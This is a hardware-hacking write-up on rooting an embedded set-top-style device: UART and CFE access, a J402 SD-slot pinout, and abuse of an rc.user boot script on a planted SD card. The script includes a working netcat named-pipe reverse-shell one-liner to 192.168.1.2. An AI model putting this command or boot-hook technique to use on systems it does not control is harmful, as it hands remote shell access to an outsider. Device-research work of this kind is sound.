Some notes:
- The trick to append `init=/bin/sh` to `STARTUP` won't work.

## Getting shells

### 1. UART shell

UART shell can be accessed via J301 header with the following pins respectively: GND-RX-TX-VCC. However, I did not manage to proceed further than the CFE shell, as the Linux system requires logging in. To access the CFE shell, press Ctrl+C repeatedly when powering up the device.

### 2. System shell

In order to get to the system shell, some techniques need to be used. 

There is an unpopulated micro SD slot at J402 header. I initially thought it was the pinout of the flash chip, however by overlaying the images of the front and back of PCB and aligning the vias, I found out that it is not. The 7241 SoC has at least two SD/eMMC interfaces, one of the goes to the eMMC while the other goes to the header. An interesting note is that this SD card slot connects to the first SD/eMMC bus of the SoC (or at least first in the device tree used to compile the OS), thus getting the first number when enumerated (`mmcblk0` instead of `mmcblk1`). 

You can solder a micro sd slot directly to J402 as its pinout is very straightforward. But for extra clarity, here's the J402 header pinout (from left to right, respectively):
1. DAT1
2. DAT0
3. GND (VSS)
4. CLK
5. VCC (VDD)
6. CMD
7. DAT3
8. DAT2

This lefts the eMMC to the second node (mmcblk1). Booting up with a blank SD card reveals that unfortunately (fortunately for us), the system is hardcoded to use `mmcblk0` to mount /usr and /data. We also know the filesystem type of these two partitions are of ext4. Moreover, it tries to run a script named `rc.user` at the root of the `usr` partition.

With this knowledge, we will proceed to create two partitions on the card. The first partition will be named `usr` and the second partition will be named `data`. 

After creating the partitions, download Busybox for MIPS little endian (https://www.busybox.net/downloads/binaries/1.21.1/busybox-mipsel) and create a file named `rc.user` in root of `usr`. The `rc.user` file is a script that will be executed upon boot. We will use this opportunity to make it establish a reverse shell to our machine. Let's assume that our machine's address is 192.168.1.2.

The `rc.user` script needs to do at least these following things:
1. Copy busybox-mipsel to /bin: `cp busybox-mipsel /bin` because there is no `nc` utility in the box's stock `busybox`.
2. Softlink the nc utility: `ln -s /bin/busybox-mipsel /bin/nc`
3. (optional, if there is no DHCP) `ifconfig eth0 192.168.1.3`
4. Establish reverse shell: `rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 4242 >/tmp/f`

To have the system automatically reconnect without having to reboot when we mistakenly press Ctrl+C in the shell, it is good to put the 4th command in a infinite while loop.

That's it! Now our SD card contains the neccessary files to begin hacking the box. Pop it in the soldered sd slot, power the box on and wait for the shell.
